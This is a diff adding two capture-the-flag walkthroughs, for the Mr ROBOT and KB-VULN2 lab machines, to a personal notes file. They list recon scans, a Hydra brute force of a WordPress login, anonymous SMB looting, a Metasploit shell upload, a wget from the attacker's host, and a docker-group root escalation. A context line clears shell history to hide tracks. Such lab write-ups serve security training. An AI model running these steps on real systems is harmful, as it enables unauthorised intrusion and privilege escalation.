@@ -373,7 +373,153 @@ root@cengbox:~# cat /dev/null > ~/.bash_history && history -c
 
 ####################################################################################################################################################
 
+Mr ROBOT walkthrough
+
+LEVEL  EASY
 
 
+1 - nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.43.237
+
+2 - dirb http://192.168.43.237/ -r
+
+==> DIRECTORY: http://192.168.43.237/image/                                    
+==> DIRECTORY: http://192.168.43.237/Image/                                    
++ http://192.168.43.237/robots (CODE:200|SIZE:41)                              
++ http://192.168.43.237/robots.txt (CODE:200|SIZE:41)  
++ http://192.168.43.237/login (CODE:302|SIZE:0)                                                               
+==> DIRECTORY: http://192.168.43.237/wp-admin/  
++ http://192.168.43.237/wp-login (CODE:200|SIZE:2696)     
++ http://192.168.43.237//license.txt
+
+
+3 - wpscan --url 192.168.43.237/ --enumerate ap,at,cb,dbe                     
+
+4 - nikto -h http://192.168.43.237
+
+-----> in robots.txt:
+we found two file: dic and key
+# curl http://192.168.43.237/key-1-of-3.txt
+
+073403c8a58a1f80d943455fb30724b9
+
+
+5 - hydra -t 64 -L fsocity.dic -p test  192.168.43.237 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
+
+[80][http-post-form] host: 192.168.43.237   login: Elliot   password: test
+
+---> now we found correct username
+
+
+6 -  wpscan -t 10000 -U Elliot -P fsocity.dic --url http://192.168.43.237
+
+7 - 
+
+
+
+#######################################################################################################################################################
+
+KB-VULN2 walkthrough
+
+LEVEL EASY
+
+1 - nmap -sS -Pn -sV -p21,22,25,80,8080,139,445 192.168.43.134
+smb is open ...
+
+2 - dirb http://192.168.43.134 -r
+
+==> DIRECTORY: http://192.168.43.134/wordpress/ 
+
+Test For Any possible anonymous login:
+
+2 - smbclient -L \\\\192.168.43.134\\
+
+3 - smbclient \\\\192.168.43.134\\Anonymous
+
+smb:> get backup.zip 
+
+4 - unzip backup.zip 
+
+- vim remember_me.txt
+
+Username:admin
+Password:MachineBoy141
+
+5 - use unix/webapp/wp_admin_shell_upload inmsfconsole to upload shell on authenticated wp web
+
+meterpreter > getuid
+Server username: www-data (33)
+meterpreter > shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+www-data@kb-server:$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@kb-server:$ cat /etc/passwd
+
+kbadmin:x:1000:1000:MachineBoy:/home/kbadmin:/bin/bash
+
+www-data@kb-server:$ su kbadmin
+Password: MachineBoy141
+
+kbadmin@kb-server:$ id
+id
+uid=1000(kbadmin) gid=1000(kbadmin) groups=1000(kbadmin),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)
+
+kbadmin@kb-server:$ cd ../..
+kbadmin@kb-server:$ cd home/
+kbadmin@kb-server:$ cd kbadmin
+
+6 - 
+
+kbadmin@kb-server:~$ wget http://192.168.43.119:8090/ubuntu.tar 
+----->(download ubuntu.tar docker image from my own system (its optional you can do it just by downloading image from docker hub))
+kbadmin@kb-server:$ pwd
+/home/kbadmin
+
+7 - 
+
+load image :
+
+kbadmin@kb-server:~$ docker load < ubuntu.tar
+
+kbadmin@kb-server:~$ docker images         
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+<none>              <none>              72300a873c2c        8 months ago        64.2MB
+
+----> my image didnt have any name so i should give something to it (you may not.....its optional)
+
+kbadmin@kb-server:~$ docker image tag 72300a873c2c ubuntu:latest 
+
+kbadmin@kb-server:~$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              72300a873c2c        8 months ago        64.2MB
+
+
+create docker container with file system volume:
+
+kbadmin@kb-server:~$ docker run -itd -v /:/mnt ubuntu:latest
+kbadmin@kb-server:~$ docker ps       
+docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+7d55855a4035        ubuntu:latest       "/bin/bash"         26 seconds ago      Up 19 seconds                           interesting_solomon
+
+kbadmin@kb-server:~$ docker exec -it interesting_solomon bash
+
+
+root@7d55855a4035:/# cd mnt	
+
+root@7d55855a4035:/mnt# cd root 
+
+root@7d55855a4035:/mnt/root# ls
+flag.txt
+
+root@7d55855a4035:/mnt/root# cat flag.txt
+dc387b4cf1a4143f562dd1bdb3790ff1
+
+DONE !
+##################################################################################################################################3##########
 
 
